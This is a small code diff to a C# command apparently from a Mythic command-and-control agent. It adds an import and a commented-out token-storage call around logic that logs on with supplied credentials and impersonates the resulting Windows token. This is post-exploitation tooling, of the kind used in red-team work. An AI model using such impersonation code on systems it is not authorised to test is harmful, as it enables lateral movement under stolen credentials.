@@ -1,4 +1,5 @@
 ﻿using Models.Tasks;
+using Managers;
 
 using Extend;
 
@@ -27,6 +28,7 @@ namespace Tasks.Commands
             if (Native.Advapi.LogonUserA(username, domain, Arguments.password, Native.Advapi.LogonProvider.LOGON32_LOGON_NEW_CREDENTIALS,
                     Native.Advapi.LogonUserProvider.LOGON32_PROVIDER_DEFAULT, ref hToken))
             {
+
                 if (Native.Advapi.ImpersonateLoggedOnUser(hToken))
                 {
                     var identity = new WindowsIdentity(hToken);
@@ -39,6 +41,8 @@ namespace Tasks.Commands
                         status = "success"
                     };
                 }
+
+                //var success = IdentityManager.AddToken(hToken);
 
                 result = new MythicTaskResult
                 {
